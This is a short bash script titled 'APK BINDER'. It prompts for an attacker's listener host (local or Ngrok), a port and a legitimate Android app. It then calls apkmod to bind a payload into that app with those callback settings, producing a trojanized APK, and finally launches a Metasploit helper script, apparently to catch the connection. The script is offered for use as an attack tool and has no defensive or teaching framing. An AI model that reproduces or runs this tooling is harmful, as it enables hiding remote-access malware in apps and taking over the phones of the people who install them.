#!/bin/bash
# -*- coding: utf-8 -*-
#CODED BY ISURUWA


red='\033[1;31m'
rset='\033[0m'
gr='\033[1;32m'
ye='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'

clear
toilet -f mono12 -F gay " APK"
toilet -f mono12 -F gay " BINDER"
sleep 1
echo ""

function lhost(){

echo -e $gr " [L] Enter Local Host or Ngrok "
echo -n -e " [L]: "
read lhost

}
function lport(){

echo -e $ye " [P] Assign Local Port "
echo -n -e " [P]: "
read lport

}
function bindapk (){

echo -n -e $pink " [B] Name of the Original Binding Apk with Directory "
echo -n -e " [B]: "
read bindapk

}
function outapk(){

echo -n -e $cyan " [N] Assign a name for output Apk  "
echo -n -e " [O] : "
read outapk

}


echo ""
lhost
echo ""
lport
echo ""
bindapk
echo ""
outapk
echo ""
apkmod -b $bindapk -o $outapk.apk lhost=$lhost lport=$lport
sleep 1
clear
toilet -f mono12 -F gay "APK"
toilet -f mono12 -F gay " BINDER"
sleep 1
echo ""
echo -e $gr "APK BINDED"
echo ""
echo -n -e $cyan "Press Enter To Continue : "
read input
cd
cd MSF
bash msf.sh



